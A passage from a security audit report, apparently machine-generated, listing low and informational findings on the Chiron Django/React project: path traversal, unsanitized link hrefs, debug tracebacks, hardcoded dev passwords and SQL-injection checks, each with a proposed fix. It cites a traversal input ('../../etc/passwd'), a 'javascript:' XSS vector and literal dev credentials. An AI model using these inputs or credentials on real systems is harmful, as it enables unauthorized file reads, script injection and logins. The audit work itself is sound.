**Impact.** An operator (or a script/cron invoking these commands with attacker-influenced arguments) can read or overwrite files outside the intended backup directory. Exploitation requires the ability to run manage.py, so this is a hardening gap rather than a remote vulnerability - these are CLI management commands, not HTTP endpoints. Impact is limited to environments where command arguments are derived from untrusted input.

**Fix.** The proposed fix is sound. Prefer the containment check over bare basename so a legitimately nested backup layout still works: `base = Path(backup_dir).resolve(); target = (base / filename).resolve(); if not target.is_relative_to(base): raise ValueError('filename escapes backup dir')` (is_relative_to is fine — the venv is Python 3.12). Apply the same validation to both the restore and backup call sites (it lives in the shared helper, so one fix covers both). If broader compatibility is ever needed, `os.path.commonpath([base, target]) == base` is an equivalent pre-3.9 form.

> _Verifier note:_ Every element of the finding checks out against the source. helpers.py:149 is exactly `filepath = os.path.join(backup_dir, filename)` inside prepare_backup_file_path (lines 133-151), with no normalization or containment check — the only path work is `Path(backup_dir).mkdir(parents=True, exist_ok=True)` on the directory, and `os.path.exists`. `os` and `Path` are both imported (helpers.py:7-8). In chiron_restore_dataset.py the `filename` is the CLI positional arg (add_arguments lines 52-55; read at handle() line 85) and `backup_dir` comes from `--backup-dir` (lines 61-66); the returned filepath 


### 25. 🟨 LOW — Unbounded file path in CSV source ingestion via string concatenation

- **Category:** path-traversal  
- **Verification:** CONFIRMED  
- **Location:** `chiron/processors/source/csv.py:57; chiron/data_dictionary/csv_autocreate.py:47`

**What it is.** The CSV source processor sets `self.filepath = chiron_settings.CHIRON_SOURCE_DATA_DIRECTORY + filepath` (chiron/processors/source/csv.py:57) and later `open(self.filepath, 'rb')` (:93); csv_autocreate.py:47 does the identical concatenation with `self.filename` then opens it (:170,:201). CHIRON_SOURCE_DATA_DIRECTORY defaults to "" (chiron/chiron_settings.py:228). Because this is naive string concatenation (not os.path.join with containment), a `filepath` such as '../../etc/passwd' or an absolute path is read directly with no boundary check. `filepath` comes from Source processor args in the data dictionary.

**Impact.** A data-dictionary maintainer can cause the ETL run to open arbitrary files on the server filesystem as a data source. This is CLI/ETL-time (chiron_run_etl) under a trusted configuration role and the file contents are loaded into the dataset rather than returned to an HTTP caller, so real-world impact is low; it is primarily a robustness/defense-in-depth issue. Worth noting because the same pattern would become dangerous if source-arg configuration ever becomes writable through the API.

**Fix.** Resolve a base dir and enforce containment: base = Path(chiron_settings.CHIRON_SOURCE_DATA_DIRECTORY or ".").resolve(); target = (base / filepath).resolve(); if not target.is_relative_to(base): raise ValueError. Apply the same in csv_autocreate.py. Caveat: outright rejecting all '..' segments or absolute paths in the per-source `filepath` arg risks breaking existing configs that legitimately point outside the base — prefer the resolve()+containment approach (which naturally allows an operator-set base anywhere) over a blanket '..'/absolute-path ban, and make the base itself the single configured trust root.

> _Verifier note:_ Every cited fact matches the source exactly. csv.py:57 does `self.filepath = chiron_settings.CHIRON_SOURCE_DATA_DIRECTORY + filepath` and opens it verbatim at :93. csv_autocreate.py:47 does the identical concatenation with self.filename (= settings["filename"], :46) and opens it at :170 and :201. chiron_settings.py:228 confirms CHIRON_SOURCE_DATA_DIRECTORY defaults to "". This is naive string concatenation with no os.path.join, no resolve(), no containment check, so a filepath of '../../etc/passwd' or an absolute path is passed straight to open() and read. The filepath value comes from SourceP


### 26. 🟨 LOW — Result-cell link renders unsanitized href with target=_blank and no rel

- **Category:** xss  
- **Verification:** CONFIRMED  
- **Location:** `is4r-chiron-ui-develop/src/components/Results/FormatCell.tsx:20-25 (sink at :22); lint guard disabled at package.json:81`

**What it is.** FormatCell renders `<Link underline="none" target="_blank" href={item.link}>{item.value}</Link>` where item is result-row data returned from the backend (item:any, no scheme validation). MUI's Link does not sanitize href, so a data value of `javascript:...` becomes an executable anchor (DOM XSS on click). Additionally `target="_blank"` is used without `rel="noopener noreferrer"` (reverse tabnabbing), and the ESLint guard that would catch this is explicitly disabled: `"react/jsx-no-target-blank": "off"` (package.json:81).

**Impact.** If any result column can carry a javascript:/data: URL, clicking it runs script in the user's session (lower severity than the stored sink because it requires attacker-controlled link data and a user click). Missing rel allows an opened page to navigate the opener. Modern browsers imply rel=noopener for target=_blank, so tabnabbing is largely mitigated by defaults, leaving the unsanitized-scheme issue as the main concern.

**Fix.** In FormatCell, validate the scheme before rendering a link. Parse item.link and only render an anchor when the protocol is http: or https:; otherwise render item.value as plain text (e.g. via Typography). Example: const isSafe = (() => { try { const p = new URL(item.link, window.location.origin).protocol; return p === 'http:' \|\| p === 'https:'; } catch { return false; } })(); then render <Link href={item.link} target="_blank" rel="noopener noreferrer"> only when isSafe. Also re-enable react/jsx-no-target-blank in package.json eslintConfig.rules so future target=_blank usages are flagged.

> _Verifier note:_ All cited locations verified. FormatCell.tsx:22 renders `<Link underline="none" target="_blank" href={item.link}>{item.value}</Link>` with `item` typed `any` (line 4) and no scheme validation. I traced the data source: Table.tsx:261 passes cell items from `results`, and results = useAppSelector((state) => state.table.results) (Table.tsx:50) — backend query-result data. MUI Link is a styled <a> that does not sanitize href, and React 19 does not block javascript:/data: URLs in href (dev-only warning, attribute still set), so a `javascript:` link value becomes an executing anchor on click. `{item


### 27. 🟨 LOW — Upstream error-response bodies (Django DEBUG tracebacks) are captured verbatim into unprotected on-disk artifacts

- **Category:** sensitive-data-exposure  
- **Verification:** CONFIRMED  
- **Location:** `chiron_validator/runner.py:260-266 (_body_snippet); called at runner.py:228-230 (server_error), :222-225 (auth_error), :242-245 (precondition); persisted via db.py:214-217; written to files via report.py:183-189; output path cli.py:26`

**What it is.** For any non-2xx response the runner embeds a slice of the raw response body into the issue message: `_body_snippet` returns up to 160 chars of `resp.text` (client.py:107 keeps `r.text[:2000]` for non-JSON, e.g. an HTML 500 page). Those messages are stored in issue.message (db.record_result) and then written verbatim to three files with no redaction and no access control: validator.db (SQLite), reports/latest_run.json, and VALIDATOR_REPORT.md. I confirmed the persisted content is Django DEBUG traceback text: the current DB/report contain lines like `MultipleObjectsReturned at /api/me/ get() returned more than one ChironUser -- it returned 3!` and `ValueError at /api/v2/dataset1_stored/analysis_tools/export_csv/ No group keys passed!` plus request URLs. Separately, typecheck.py:169 embeds the actual field value (`{value!r:.60}`, up to 60 chars) into bad_enum messages, which are likewise persisted. In the intended dev/synthetic deployment this leaks only internal code paths/stack info, not PHI. But the tool (README.md:8, report.py:80-81) explicitly asserts 'No real PHI is used or generated' — a claim that holds only for the synthetic dataset. If the same binary is ever pointed at a dataset with real records (e.g. CHIRON_BASE_URL set to a non-dev host), a 500 body or an enum-mismatch value would write real response content into these files verbatim, silently violating the stated no-PHI guarantee.

**Impact.** In dev: internal stack/traceback details persisted to disk. If repurposed against real data, response payload fragments (error bodies, enum actual values) become PHI-bearing on-disk artifacts with no redaction, retention limit, or access control — undermining the tool's own no-PHI safety claim.

**Fix.** Stop persisting raw upstream body bytes by default. In _body_snippet, for >=400 responses store only status + a fixed classifier label (the messages already carry a human-readable label like 'server error'/'auth_error'), or gate the raw-body interpolation behind an explicit --capture-error-bodies flag that defaults off. For typecheck.py:169 bad_enum, report only the wire type and expected enum set, not {value!r}. The highest-value control is turning the assumed no-PHI guarantee into an enforced one: refuse to run (or force redaction) when base_url is not localhost/127.0.0.1, so the guarantee documented in report.py:80-81 cannot be silently violated by CHIRON_BASE_URL pointing at a real-data host.

> _Verifier note:_ Every cited location verified in /Users/pot95a/2026/new_chiron/chiron-validator/ (the finding's chiron-benchmark path is wrong, but the code exists). runner.py:260-266 _body_snippet returns s[:160] of resp.text (or json dump); it is interpolated verbatim into Issue messages for auth_error (223-225), server_error (228-230), not_found (233-235), and precondition (243-245). client.py:107 preserves r.text[:2000] for non-JSON bodies, so an HTML 500 page flows through. db.py:214-217 inserts iss.message verbatim into the SQLite issue table; report.py:183-189 write_report dumps the same messages to ma


### 28. 🟨 LOW — Hardcoded default dev password in source; credentials accepted via argv

- **Category:** credential-handling  
- **Verification:** CONFIRMED  
- **Location:** `chiron_validator/cli.py:97-98 (defaults), :43 (passed to client); README.md:64,78`

**What it is.** The `run` subcommand hardcodes `--username admin` (cli.py:97) and `--password chiron-dev-pw` (cli.py:98) as literal defaults, so a bare `chiron-validator run` attempts an admin login with a password baked into the source tree. Env vars (CHIRON_USER/CHIRON_PASSWORD) are supported and are the safer path, but the literal fallback ships the credential in code. When a password is supplied via `--password` on the command line it is visible to any local user via `ps`/process listing and lands in shell history. Credentials are NOT stored in the DB or reports (verified: the run table stores only base_url/dataset/version/notes; grep for password/pw/authorization/sessionid in validator.db and latest_run.json returned nothing), so this is confined to the source default and the argv exposure.

**Impact.** A real (if weak) dev credential is committed in source, normalizing credential-in-repo and enabling trivial admin login against any reachable dev instance that reuses it; argv passing exposes the secret to other local users and shell history.

**Fix.** Proposed fix is sound: set the `--password` default to None and, when unset after checking CHIRON_PASSWORD, prompt via getpass.getpass() rather than baking `chiron-dev-pw` into source; likewise drop the literal `admin` username default (line 97) or leave it but require the password interactively. Remove the plaintext `--password chiron-dev-pw` from README (line 65, not 64). Additionally, apply the same change to the sibling tool at chiron-benchmark/bench/cli.py:25, which carries the identical hardcoded `chiron-dev-pw` default. Since this is a documented local-only dev credential, prioritize rotating/removing it from source and any shared dev fixtures over treating it as an exploitable production secret.

> _Verifier note:_ Every cited line matches verbatim. chiron_validator/cli.py:97 hardcodes `--username` default `admin` and :98 hardcodes `--password` default `chiron-dev-pw` as literal env-var fallbacks; :43 passes args.username/args.password straight into ChironClient. README lines 65 and 78-79 confirm the plaintext example and env-var support (finding's line 64 is off-by-one but the example is present). I verified the finding's non-storage claim directly: db.py:55-66 defines the `run` table with columns started_at/base_url/dataset/chiron_version/notes only, and start_run() (db.py:187) inserts just those — no 


### 29. ⬜ INFO — DEBUG=True with no global DRF permission default in the runnable reference settings

- **Category:** insecure-config  
- **Verification:** PLAUSIBLE (severity adjusted from low)  
- **Location:** `test_project/project/settings.py:29 (DEBUG=True) and absence of any REST_FRAMEWORK block (contrast test_settings.py:109-115 which sets DEFAULT_PERMISSION_CLASSES=IsAuthenticated for tests only)`

**What it is.** The reference/runserver settings run with DEBUG=True and define no REST_FRAMEWORK settings, so DRF's DEFAULT_PERMISSION_CLASSES falls back to AllowAny. The pytest settings (test_settings.py:109) correctly set IsAuthenticated as the default — an inconsistency meaning the actual demo server is less locked-down than the test suite. Existing viewsets each set permission_classes explicitly (verified: IsAuthenticated across the api/api_v2 viewsets), so no current endpoint is exposed, but any future viewset that forgets permission_classes defaults open on the demo server, and DEBUG=True leaks tracebacks/SECRET_KEY on error pages if the demo is ever exposed.

**Impact.** Defense-in-depth gap: a forgotten per-view permission would be publicly accessible on the demo server; DEBUG tracebacks leak configuration if deployed.

**Fix.** Optional hardening only — this is a demo project, not a deployment target. If you want the demo to match the test suite's posture, add REST_FRAMEWORK = {'DEFAULT_PERMISSION_CLASSES': ['rest_framework.permissions.IsAuthenticated']} to test_project/project/settings.py so a future viewset that forgets permission_classes fails closed. Do NOT change DEBUG in this file: it is an intentional runserver/demo settings module (dev SECRET_KEY, empty ALLOWED_HOSTS, SQLite) and env-driving DEBUG=False by default would break the out-of-the-box demo. Real production hardening belongs in an actual deployment settings module, which this is not.

> _Verifier note:_ All cited locations verified against source in /Users/pot95a/2026/new_chiron/is4r-chiron-develop/. settings.py:29 is `DEBUG = True` (a file self-labeled "Quick-start development settings - unsuitable for production", with hardcoded dev SECRET_KEY line 26, ALLOWED_HOSTS=[], SQLite). The reference settings.py (read in full, 1-159) has no REST_FRAMEWORK block. test_settings.py:109-115 sets DEFAULT_PERMISSION_CLASSES=[IsAuthenticated]. The DRF fact (default is AllowAny when unset) is correct. I also confirmed the finding's own mitigating claim: every viewset in chiron/api and chiron/api_v2 sets pe


### 30. ⬜ INFO — Hardcoded default Postgres credentials in reference/test config (demo-only)

- **Category:** hardcoded-secret  
- **Verification:** CONFIRMED  
- **Location:** `test_project/project/settings.py:149 and test_project/test_settings.py:125 (postgresql://postgres:postgres@localhost:5432/chiron); .github/workflows/lint_and_test.yml POSTGRES_PASSWORD: postgres`

**What it is.** The research-data connection string hardcodes the weak default postgres/postgres credentials against localhost in both the reference and test settings. The CI workflow likewise sets POSTGRES_PASSWORD: postgres, but that is an ephemeral GitHub Actions service container reachable only within the job — not a committed production secret. No real secrets, API keys, or tokens are committed anywhere in the scanned config/CI (verified: .env is gitignored, only a secret-free .env.sample is committed).

**Impact.** None in CI/local. Risk is only that the weak default connection string in the reference config is copied verbatim into a real deployment.

**Fix.** In any non-throwaway settings module, read CHIRON_SQL_ALCHEMY_CONNECTION_STRING from an environment variable / secret store (e.g. os.environ["CHIRON_SQL_ALCHEMY_CONNECTION_STRING"]) rather than a literal, and add a comment marking the postgres/postgres@localhost value as local/CI-only in test_project and CI. While editing these demo settings, also externalize the hardcoded Django SECRET_KEY (test_project/project/settings.py:26, test_project/test_settings.py:14) and the Mongo root/secret credential (performance_project/project/settings.py:141) so the reference projects do not model committing secrets. No CI change is required — the ephemeral POSTGRES_PASSWORD in lint_and_test.yml is acceptable as-is.

> _Verifier note:_ The cited files are not under the scanned cwd (chiron-benchmark) but in the sibling repo /Users/pot95a/2026/new_chiron/is4r-chiron-develop; I opened them there and the code matches the claim exactly. test_project/project/settings.py:149 and test_project/test_settings.py:125 both contain CHIRON_SQL_ALCHEMY_CONNECTION_STRING = "postgresql://postgres:postgres@localhost:5432/chiron" as literal hardcoded strings. Surrounding context confirms these are demo/reference and test configs (CHIRON_SITE_TITLE = "Chiron Test Project", CHIRON_INFOBAR = "small dummy database for testing", CHIRON_POSTGRES_SCHE


### 31. ⬜ INFO — MUI x-license key injected via Docker build ARG (persists in image metadata)

- **Category:** insecure-config  
- **Verification:** CONFIRMED  
- **Location:** `is4r-chiron-ui-develop/Dockerfile:2-3 (ARG/ENV VITE_MUI_KEY) and src/App.tsx:22 (LicenseInfo.setLicenseKey(import.meta.env.VITE_MUI_KEY))`

**What it is.** The MUI commercial license key is passed as a Docker build ARG and set as a VITE_ env var, then embedded into the client bundle at build time (this is by design for @mui/x-license — the key is validated client-side and is not a cryptographic secret). It is not hardcoded in source. Two minor notes: (1) build ARGs are recorded in image history (docker history), so the key is retrievable from the built image; (2) the key ends up in the public JS bundle regardless. MUI license keys are order-locked and low-sensitivity, so this is informational.

**Impact.** Low — a leaked MUI license key can be reused by others for license/entitlement abuse, but it exposes no user or patient data and cannot forge auth.

**Fix.** Accepted risk — no source change needed. Note that because this is a multi-stage build (builder stage discarded; final nginx image only copies dist/), the `docker history` concern is largely moot for the delivered image. BuildKit secret mounts would only affect the transient builder stage's metadata and would NOT remove the key from the compiled bundle, since MUI X requires the key to be present in client-side JS. The exposure is therefore inherent to MUI's licensing model and cannot be meaningfully mitigated by build tooling; treat it as a documented accepted risk and rely on MUI's order-locking for the key.

> _Verifier note:_ Both cited locations match exactly. Dockerfile lines 2-3 read `ARG VITE_MUI_KEY` then `ENV VITE_MUI_KEY=${VITE_MUI_KEY}`. src/App.tsx line 22 reads `LicenseInfo.setLicenseKey(import.meta.env.VITE_MUI_KEY);` with the import from `@mui/x-license` on line 18. The finding is accurate on its core points: the key is NOT hardcoded (it is a build-time injected VITE_ env var), it is baked into the public client bundle at build time, and this is by-design behavior for @mui/x-license (validated client-side, not a cryptographic secret). The impact assessment is correct — a leaked MUI key enables only lice


### 32. ⬜ INFO — UI dependencies checked — resolved versions are at patched releases (no CVE findings)

- **Category:** dependency-cve  
- **Verification:** CONFIRMED  
- **Location:** `/Users/pot95a/2026/new_chiron/is4r-chiron-ui-develop/package.json, pnpm-lock.yaml`

**What it is.** Verified resolved versions in pnpm-lock.yaml (lockfileVersion 9.0) for the high-risk libraries and their transitives: lodash@4.17.21, react/react-dom@19.1.1, react-router-dom@7.8.2 (above 7.5.2, so CVE-2025-43864/43865 are patched), vite@7.1.5, esbuild@0.25.10 (above 0.25.0, so the dev-server CORS advisory GHSA-67mh-4wv8-2f99 is patched), form-data@4.0.4 (the exact fix for CVE-2025-7783), ws@8.18.3, cross-spawn@7.0.6, semver 6.3.1/7.7.2, micromatch@4.0.8, nanoid@3.3.11, postcss@8.5.6, brace-expansion 1.1.12/2.0.2, tough-cookie@5.1.2, cookie@1.0.2, json5 1.0.2/2.2.3, word-wrap@1.2.5, rollup@4.52.4 — all at or above the versions that fixed their respective known CVEs. Unlike the backend, the UI has a committed lockfile pinning transitives.

**Impact.** No actionable frontend dependency-CVE finding. Included so the parent audit knows the UI dependency surface was examined, not skipped.

**Fix.** No code change needed. The note is accurate as documentation of the examined dependency surface. Keep the committed lockfile and run `pnpm audit` / Dependabot regularly, since these are point-in-time version checks that go stale as new advisories (e.g. future vite/esbuild) are published.

> _Verifier note:_ I read /Users/pot95a/2026/new_chiron/is4r-chiron-ui-develop/package.json and grepped pnpm-lock.yaml for every package named in the finding. All claims verify exactly: lockfileVersion is '9.0'; a committed lockfile pins transitives. Resolved versions all match — lodash@4.17.21, react/react-dom@19.1.1, react-router-dom/react-router@7.8.2, vite@7.1.5, esbuild@0.25.10, form-data@4.0.4, ws@8.18.3, cross-spawn@7.0.6, semver 6.3.1/7.7.2, micromatch@4.0.8, nanoid@3.3.11, postcss@8.5.6, brace-expansion 1.1.12/2.0.2, tough-cookie@5.1.2, cookie@1.0.2, json5 1.0.2/2.2.3, word-wrap@1.2.5, rollup@4.52.4. Th


### 33. ⬜ INFO — No unsafe deserialization present in application code (scope confirmation)

- **Category:** insecure-deserialization  
- **Verification:** CONFIRMED  
- **Location:** `chiron/ (whole tree); chiron/management/commands/chiron_restore_dataset.py:92-93; chiron/management/commands/chiron_restore_dd.py:69-72`

**What it is.** Scoped grep for pickle, marshal, yaml.load, jsonpickle, literal_eval, eval(, exec(, and __import__ across chiron/ returned only matches inside .venv/ third-party libraries; there are none in application code. The dataset restore path deserializes with json.load (chiron_restore_dataset.py:92-93) and Django's loaddata (chiron_restore_dd.py:69-72), both of which construct only declared model instances and do not execute embedded code. No YAML is parsed anywhere in chiron/.

**Impact.** None - this entry documents that the insecure-deserialization portion of the audit scope is clean, so the absence is not mistaken for an unreviewed area.

**Fix.** No action needed. If a binary/object cache is ever added, keep using json and never pickle/yaml.load for any externally-sourced data.

> _Verifier note:_ Verified all three claims directly. chiron_restore_dataset.py lines 92-93 are exactly `with open(filepath, "r") as f:` / `self.dd = json.load(f)`; the file thereafter only builds declared Django model instances (models.Dataset(**entry), models.PermissionGroup(**entry), models.Concept(**entry), etc.) from the parsed dict, with no code-execution path. chiron_restore_dd.py lines 69-72 are exactly `call_command("loaddata", filepath,)`, Django's fixture loader which instantiates registered models and does not eval embedded code. A scoped grep of chiron/ (*.py) for pickle\|marshal\|yaml.load\|jsonpi


### 34. ⬜ INFO — Verified non-issues (documented for completeness)

- **Category:** audit-notes  
- **Verification:** CONFIRMED  
- **Location:** `is4r-chiron-ui-develop/src/App.tsx:22; src/components/Filters/DescribeFilters.tsx:65; src/components/Filters/CriteriaSet.tsx:150,219,298; src/components/Report/ReportDetails.tsx:54; src/components/InfoBanner.tsx; src/api/index.ts:9; vite.config.ts`

**What it is.** Items in scope that were checked and found NOT to be vulnerabilities: (1) The MUI X license key (App.tsx:22, `LicenseInfo.setLicenseKey(import.meta.env.VITE_MUI_KEY)`) is baked into the client bundle, but MUI X license keys are designed to be client-embedded and validated client-side — not a secret; no other API keys/tokens are present in the bundle. (2) The <Interweave> usages in DescribeFilters and CriteriaSet render server HTML but through interweave 13.1.1, which by default strips on* event handlers, javascript:/vbscript:/livescript: URL schemes, and disallowed tags (verified in node_modules/interweave/lib/index.js:328 and bundle TAGS blacklist); the CriteriaSet transform only re-wraps <strong>. (3) Report description is rendered as plain text `<p>{reportDescription}</p>` (ReportDetails.tsx:54), React-escaped — safe. (4) The 'infobar' (InfoBanner.tsx) is static hardcoded text — no injection. (5) Auth is cookie-based (api/index.ts:9 credentials:'include'); no tokens are stored in localStorage or the bundle. (6) vite.config.ts sets `Access-Control-Allow-Origin: *` only on the Vite dev server, not production nginx.

**Impact.** None — recorded so the reviewer knows these were examined and cleared.

**Fix.** No action required.

> _Verifier note:_ All six "verified non-issue" determinations are accurate against the actual code at /Users/pot95a/2026/new_chiron/is4r-chiron-ui-develop.  (1) App.tsx:22 is exactly `LicenseInfo.setLicenseKey(import.meta.env.VITE_MUI_KEY)`. MUI X commercial license keys are by design client-embedded and client-validated (order-hash, not a secret). The only other env vars referenced are VITE_MATOMO_DOMAIN/SITE_ID/TRACKER_OPTIONS, VITE_SHOW_INFO_BAR (public config/flags) — no API keys or tokens.  (2) DescribeFilters.tsx:65 `<Interweave content={description} />`, CriteriaSet.tsx:150 (with transform), :219, :298 a


### 35. ⬜ INFO — Bundled Django projects ship DEBUG=True, which would render patient-like data in 500 tracebacks

- **Category:** information-exposure  
- **Verification:** PLAUSIBLE (severity adjusted from low)  
- **Location:** `is4r-chiron-develop/test_project/project/settings.py:29; is4r-chiron-develop/performance_project/project/settings.py:29`

**What it is.** Both bundled projects set DEBUG = True. The reusable chiron app itself correctly leaves DEBUG to the host project (chiron_settings.py defines no DEBUG). However, if either bundled settings file is used as a deployment template, Django's technical 500 page renders local variables from every frame -- which in this codebase routinely include cohort/query result rows and raw record values (e.g. the querytool result lists in query_engine/postgres/querytool.py, display values, and CSV export rows). An unhandled exception while processing real subject data would therefore expose patient-like values plus SQL and settings to whoever triggers the error. This is a deployment-configuration issue, not a flaw in the library code, hence low severity.

**Impact.** In any environment mistakenly run with DEBUG=True over non-synthetic data, tracebacks leak patient-like field values, query internals, and configuration to end users on errors.

**Fix.** No code change is strictly required, since these are dev/CI/performance scaffolds already labeled unsuitable for production. If desired for defense-in-depth, source DEBUG from an environment variable defaulting to False (e.g. DEBUG = os.environ.get("DJANGO_DEBUG", "") == "1") and add an inline comment stating these settings are for local/CI use only. Any real production deployment must set DEBUG=False and a proper ALLOWED_HOSTS regardless.

> _Verifier note:_ I opened both cited files. test_project/project/settings.py:29 and performance_project/project/settings.py:29 both contain `DEBUG = True`, exactly as claimed. Line 28 in each carries the stock Django warning "SECURITY WARNING: don't run with debug turned on in production!" and both files are headed "Quick-start development settings - unsuitable for production." I confirmed the finding's supporting claims: a grep for DEBUG across the reusable chiron/ app (including chiron/chiron_settings.py) returns nothing, so the library genuinely defers DEBUG to the host project; and chiron/query_engine/post


### 36. ⬜ INFO — Runtime query-engine path (cohort/report/analysis compilation) is parameterized — no injection found

- **Category:** sql-injection  
- **Verification:** CONFIRMED  
- **Location:** `chiron/query_engine/postgres/sql_alchemy_queries/ (query_builder.py, sections/where_builder.py, select_builder.py, order_by_builder.py); chiron/processors/cohort_def/*.py; chiron/api_v2/authorization.py:9, permissions.py:17`

**What it is.** The end-user-facing path that compiles user-defined concepts/cohorts/tables into queries is built entirely with the SQLAlchemy expression language and shows no injection. Columns are always resolved via `getattr(table.c, <id>)` (where.build/select_builder), so an id that is not a real column raises AttributeError rather than being interpolated, and any resolved identifier is auto-quoted by SQLAlchemy. All user filter values are bound: cohort_def/text.py:322-335 uses `column.regexp_match(regex_val)`, `column.in_(...)`, `column.is_(None)`; number.py/date.py/detailed_age.py use `column >= min_limit` comparators (date.py parses input to a date first); category.py/number_with_categories.py use `column.in_(terms)`; ontology.py uses `hierarchy_column.overlap(cast(array(codes), ARRAY(String(150))))`; boolean.py uses `column.is_(term)`; the prefilter path (where_builder.py:59-66) uses `getattr(table.c, concept_id) == value`. The concept-search `ilike(f"%{search_param}%")` (query_builder.py:491-495) interpolates only the wildcards into the Python string that SQLAlchemy then binds as one parameter — not SQL injection. The greedy URL regex `(?P<dataset_string>.+)` resolves to a dataset only via ORM equality `Dataset.objects.get(unique_id=dataset_string)` (authorization.py:9) and the schema name comes from the stored slug `database_name`, so the greedy capture does not reach a SQL string. LIMIT/OFFSET use `.limit()/.offset()`. A grep across the whole scope found no os.system/subprocess/Popen/shell=True/eval/exec.

**Impact.** None — documents that the primary attacker-reachable surface (authenticated API users building cohorts/reports) is not injectable, so review effort should focus on the ETL/DDL trust boundary in the first finding.

**Fix.** No change required. Maintain the invariant: resolve identifiers only through `getattr(table.c, ...)` and pass all values through SQLAlchemy operators/binds; never format identifiers or values into text() strings in the query engine.

> _Verifier note:_ Independently opened every cited location and confirmed the finding's claim: the runtime cohort/report/analysis query-compilation path is built entirely with the SQLAlchemy expression language and is not injectable. Verified — (1) Identifiers are always resolved via getattr(table.c, <id>): where_builder.py:65 prefilter (getattr(table.c, concept_id) == value), 214/226/383; select_builder.py:52 and query_builder.py:165 build field_name via str.format only to feed getattr(table.c, ...), so an invalid id raises AttributeError rather than being spliced into SQL; processors text.py:309/315, number.p


### 37. ⬜ INFO — query subcommand executes arbitrary, unparameterized SQL against the local validation DB

- **Category:** sql-injection  
- **Verification:** CONFIRMED  
- **Location:** `chiron_validator/cli.py:73-83 (cmd_query -> db.conn.execute(args.sql))`

**What it is.** `cmd_query` passes the operator-supplied `sql` argument straight to `db.conn.execute()` with no parameterization or statement-type restriction, so it will run any statement (SELECT, but also UPDATE/DELETE/DROP) against validator.db. This is acceptable by design (per the tool's brief and README.md:73-77 it is an ad-hoc local query helper) and there is no untrusted input path — the SQL comes only from the operator's own CLI invocation against their own local SQLite file, which never contains PHI or credentials. Noting it for completeness as requested: the only realistic downside is an operator accidentally mutating/dropping their own results store.

**Impact.** None beyond the operator's own local DB; no injection vector from external/untrusted data.

**Fix.** Optional hardening only, not required for the tool's purpose: for this subcommand open the DB read-only via `sqlite3.connect(f"file:{path}?mode=ro", uri=True)` (or reject statements whose first keyword is not SELECT) to prevent an operator from accidentally mutating/dropping their own local results store. Note the read-only connection would need to bypass ValidatorDB.__init__'s `executescript(SCHEMA)` (which requires write access), e.g. a dedicated read-only accessor.

> _Verifier note:_ Verified at the real path /Users/pot95a/2026/new_chiron/chiron-validator/chiron_validator/cli.py (finding cited chiron_validator/cli.py, which lives in the sibling chiron-validator project). Lines 73-83: cmd_query does `rows = db.conn.execute(args.sql).fetchall()` — the operator SQL is passed straight to execute() with no parameterization and no statement-type restriction, so any statement (SELECT/UPDATE/DELETE/DROP) runs. The `sql` value is only a positional CLI arg (cli.py:118 `s.add_argument("sql")`), so its sole source is the operator's own shell invocation; there is no external/untrusted 


### 38. ⬜ INFO — Public-API-only / no-internal-access constraint verified as HELD; TLS verification on by default and not disable-able

- **Category:** scope-verification  
- **Verification:** CONFIRMED  
- **Location:** `chiron_validator/client.py (whole module); cli.py:43; client.py:39,46`

**What it is.** Confirming the core scoped questions with a positive result. (1) The validator never bypasses the public API: client.py speaks only HTTP via `requests`; a package-wide grep for `import django/psycopg/chiron`, `connect(...5432)`, `localhost:5432`, or `postgres` found no code imports (only prose in docstrings). It never imports Chiron and never touches its database. Its use of `/admin/login/` and `/select_dataset` (client.py:52-74) is legitimate public HTTP that the browser UI itself performs, not an internals bypass. (2) TLS: `ChironClient` defaults `verify=True` (client.py:39) and sets `session.verify` accordingly (client.py:46); cli.py:43 constructs the client without overriding it, and there is no `--insecure`/`--no-verify` flag anywhere, so certificate verification is always enforced and cannot be silently turned off. Both are correct/desirable.

**Impact.** No issue — documents that the black-box constraint and TLS posture hold.

**Fix.** No change needed. The proposed guidance (add an explicit, clearly-warned opt-in only if a self-signed staging cert ever needs support) is reasonable and does not weaken the current default.

> _Verifier note:_ All cited claims verified against source. client.py imports only `requests` (line 21) and communicates exclusively over HTTP; its `/admin/login/` (line 54) and `/select_dataset` (line 69) calls are ordinary public POSTs that mirror the browser UI, not an internals bypass. A package-wide grep for `import django/psycopg/chiron`, `connect(...5432)`, `localhost:5432`, and `postgres` returned no code hits — the only `sqlite3` usage is the validator's OWN local `validator.db` store (db.py:104, header docstring confirms it is a derived expectations/results store), and the only `postgres` mentions are


### 39. ⬜ INFO — SSRF surface via --base-url with default redirect-following (low real risk; operator-controlled)

- **Category:** ssrf  
- **Verification:** CONFIRMED  
- **Location:** `chiron_validator/client.py:77-90 (request; no allow_redirects so requests defaults to True); cli.py:96 (base_url default http://127.0.0.1:8000)`

**What it is.** The target host is fully operator-controlled (`--base-url` / CHIRON_BASE_URL, cli.py:96) and the core `request()` does not set `allow_redirects`, so redirects are followed by default. There is no untrusted input that drives the URL, so this is not an exploitable SSRF in the tool's threat model; it is noted only as surface. Credential leakage on a hostile redirect is largely mitigated by the `requests` library itself (Authorization is stripped on cross-host redirects, and the session cookie jar is domain-scoped). Secondary note: the default base_url is plaintext `http://`, and `login()` (client.py:54-63) POSTs the admin password in the clear — harmless for localhost, but if CHIRON_BASE_URL is pointed at a remote `http://` host the admin credential is transmitted unencrypted.

**Impact.** Negligible in intended use. Marginal risk of cleartext credential transmission only if an operator deliberately targets a remote plaintext-HTTP host.

**Fix.** Deprioritize the redirect angle (no untrusted input, and requests already protects credentials on cross-host redirects). The higher-value, still-minor hardening is in cli.py/ChironClient: when base_url uses http:// and the host is not localhost/127.0.0.1/::1, emit a warning (or refuse without an explicit --insecure flag) before login() transmits the admin password in cleartext. Optionally pass allow_redirects=False in client.py:89 for consistency with login()/select_dataset() since the API should not 302 on data endpoints, but this is cosmetic.

> _Verifier note:_ Every cited code fact checks out (in the sibling repo at /Users/pot95a/2026/new_chiron/chiron-validator/chiron_validator/, not the chiron-benchmark cwd, but line numbers match exactly). client.py:77-90: the core request() calls self.session.request(...) with method, url, json, params, headers, timeout and NO allow_redirects, so it inherits requests' default of True — accurate. Notably login() (line 61) and select_dataset() (line 73) DO pass allow_redirects=False, so the core path is genuinely the only redirect-following path. cli.py:96: --base-url default is os.environ.get("CHIRON_BASE_URL", "

